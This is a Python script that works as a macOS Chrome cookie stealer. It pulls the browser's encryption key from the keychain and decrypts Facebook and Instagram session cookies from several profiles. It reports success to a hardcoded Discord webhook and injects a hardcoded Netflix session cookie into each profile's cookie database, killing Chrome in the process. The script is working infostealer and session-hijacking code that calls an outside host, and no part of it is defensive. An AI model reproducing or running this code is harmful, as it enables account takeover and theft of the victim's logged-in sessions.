import os
import sqlite3
import json
import keyring
import shutil
import requests
import subprocess
import time
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2

# --- CONFIGURATION ---
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1494109026298888273/Ynr2dafzmUxTWd2F0kJSBKeDh87L2XCmFpp48Kbc2YMx6aGNJzEqAr7MEd8CqCv0wjyy"
NETFLIX_COOKIE_VAL = "243e003a-793a-4cd6-a736-ba7f059401a5"

BASE_CHROME_PATH = os.path.expanduser("~/Library/Application Support/Google/Chrome")
TEMP_DB = os.path.expanduser("~/Desktop/.audit_cache.db")

def kill_chrome():
    print("[*] Locking out Google Chrome processes...")
    subprocess.run(["pkill", "-9", "Google Chrome"], capture_output=True)
    time.sleep(2)

def get_encryption_key():
    password = keyring.get_password("Chrome Safe Storage", "Chrome")
    if not password: return None
    return PBKDF2(password, b'saltysalt', 16, count=1003)

def decrypt_value(enc_value, key):
    try:
        iv = b' ' * 16
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(enc_value[3:])
        padding_len = decrypted[-1]
        return decrypted[:-padding_len].decode('utf-8')
    except: return None

def execute_strike():
    print(f"[*] Command Center Active. Session: {os.getlogin()}")
    profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4"]
    
    for profile in profiles:
        current_chrome_db = os.path.join(BASE_CHROME_PATH, profile, "Cookies")
        if not os.path.exists(current_chrome_db):
            continue
            
        print(f"[*] Scanning Node: {profile}...")
        shutil.copyfile(current_chrome_db, TEMP_DB)
        conn = sqlite3.connect(TEMP_DB)
        cursor = conn.cursor()
        
        try:
            key = get_encryption_key()
            if not key:
                print(f"[!] Keychain denied for {profile}")
                continue

            # 1. Extraction
            query = "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%facebook.com%' OR host_key LIKE '%instagram.com%'"
            cursor.execute(query)
            exfiltration_data = []
            for host, name, enc_val in cursor.fetchall():
                decrypted = decrypt_value(enc_val, key)
                if decrypted:
                    exfiltration_data.append({"domain": host, "name": name, "value": decrypted})

            if exfiltration_data:
                payload = {
                    "content": f"**STRIKE SUCCESS: {profile}**\nUser: {os.getlogin()}",
                    "embeds": [{"title": "Meta Session Audit", "description": "Tokens secured. Mask on.", "color": 3447003}]
                }
                requests.post(DISCORD_WEBHOOK, json=payload)

            # 2. Injection
            if NETFLIX_COOKIE_VAL:
                now_ts = int((time.time() + 11644473600) * 1000000)
                expiry = 13350000000000000 
                sql = "INSERT OR REPLACE INTO cookies (creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
                params = (now_ts, '.netflix.com', '', 'NetflixId', NETFLIX_COOKIE_VAL, '/', expiry, 1, 1, now_ts, 1, 1)
                cursor.execute(sql, params)
                conn.commit()
                print(f"[+] Persistence injected in {profile}")

        except Exception as e:
            print(f"[!] Error on {profile}: {e}")
        finally:
            conn.close()
            kill_chrome()
            try:
                shutil.copyfile(TEMP_DB, current_chrome_db)
                print(f"[+++] Node {profile} synchronized.")
            except Exception as e:
                print(f"[!] Sync Error on {profile}: {e}")

    if os.path.exists(TEMP_DB): os.remove(TEMP_DB)

if __name__ == "__main__":
    execute_strike()
